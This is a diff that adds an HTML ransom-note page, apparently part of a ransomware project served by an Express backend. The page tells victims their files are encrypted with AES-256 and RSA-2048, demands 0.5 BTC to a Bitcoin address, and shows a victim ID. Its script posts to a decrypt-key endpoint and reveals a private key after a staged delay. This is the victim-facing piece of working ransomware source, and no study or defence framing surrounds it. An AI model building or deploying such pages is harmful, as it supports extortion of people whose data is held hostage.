@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Files Have Been Encrypted!</title>
+    <!-- Loads from ../client/css/style.css because of express.static -->
+    <link rel="stylesheet" href="/css/style.css">
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: #ff3333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: monospace;
+        }
+        .ransom-container {
+            background-color: #1a1a1a;
+            border: 2px solid #ff3333;
+            padding: 3rem;
+            max-width: 800px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 51, 51, 0.2);
+            border-radius: 8px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #ff3333;
+        }
+        .victim-id {
+            background: #2a2a2a;
+            padding: 10px;
+            font-family: monospace;
+            color: #fff;
+            margin: 20px 0;
+            word-break: break-all;
+        }
+        p {
+            color: #ddd;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+        .payment-box {
+            border: 1px dashed #ff3333;
+            padding: 20px;
+            margin: 20px 0;
+            background: #222;
+        }
+        .btc-address {
+            font-size: 1.2rem;
+            color: #f7931a;
+            font-weight: bold;
+            margin: 10px 0;
+            user-select: all;
+        }
+        .btn-danger {
+            background-color: #ff3333;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background 0.3s;
+        }
+        .btn-danger:hover {
+            background-color: #cc0000;
+        }
+        .btn-danger:disabled {
+            background-color: #555;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="ransom-container">
+        <h1>⚠️ YOUR FILES ARE ENCRYPTED ⚠️</h1>
+        <p>All your important documents, photos, and databases have been encrypted using military-grade <strong>AES-256-GCM</strong> algorithms. The unique decryption key has been generated and wrapped securely using RSA-2048.</p>
+        
+        <p>To recover your files, you must submit a payment. Otherwise, your unique key will be destroyed forever.</p>
+
+        <div>
+            <span>Your Victim ID:</span>
+            <div class="victim-id" id="victimId">{{VICTIM_ID}}</div>
+        </div>
+
+        <div class="payment-box">
+            <p>Send exactly <strong>0.5 BTC</strong> to the following address:</p>
+            <div class="btc-address">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+        </div>
+
+        <button id="btnVerifyPayment" class="btn-danger" style="width: 100%; font-size: 1.2rem;">Verify Payment & Get Private Key</button>
+        <p id="paymentStatus" style="margin-top: 15px; color: #ff9999; display: none;"></p>
+        
+        <div id="privateKeyContainer" style="display: none; margin-top: 20px;">
+            <p style="color: #10b981;">Payment verified! Here is your RSA Private Key. Save it to decrypt your files.</p>
+            <textarea id="privateKeyDisplay" rows="10" style="width: 100%; background: #111; color: #10b981; font-family: monospace; padding: 10px;" readonly></textarea>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('btnVerifyPayment').addEventListener('click', async () => {
+            const btn = document.getElementById('btnVerifyPayment');
+            const status = document.getElementById('paymentStatus');
+            const victimId = '{{VICTIM_ID}}';
+            
+            btn.disabled = true;
+            btn.textContent = "Verifying on blockchain...";
+            status.style.display = 'block';
+            status.style.color = '#ff9999';
+            status.textContent = "Checking for 0.5 BTC transaction...";
+
+            try {
+                const response = await fetch(`/api/decrypt-key/${victimId}`, {
+                    method: 'POST'
+                });
+                const data = await response.json();
+
+                // Fake delay for effect
+                setTimeout(() => {
+                    if (response.ok) {
+                        status.style.color = '#10b981';
+                        status.textContent = "Transaction Confirmed!";
+                        btn.style.display = 'none';
+                        
+                        document.getElementById('privateKeyContainer').style.display = 'block';
+                        document.getElementById('privateKeyDisplay').value = data.privateKey;
+                    } else {
+                        status.textContent = "Payment not found. Please try again.";
+                        btn.disabled = false;
+                        btn.textContent = "Verify Payment & Get Private Key";
+                    }
+                }, 2000);
+            } catch (e) {
+                status.textContent = "Network error connecting to server.";
+                btn.disabled = false;
+                btn.textContent = "Verify Payment & Get Private Key";
+            }
+        });
+    </script>
+</body>
+</html>
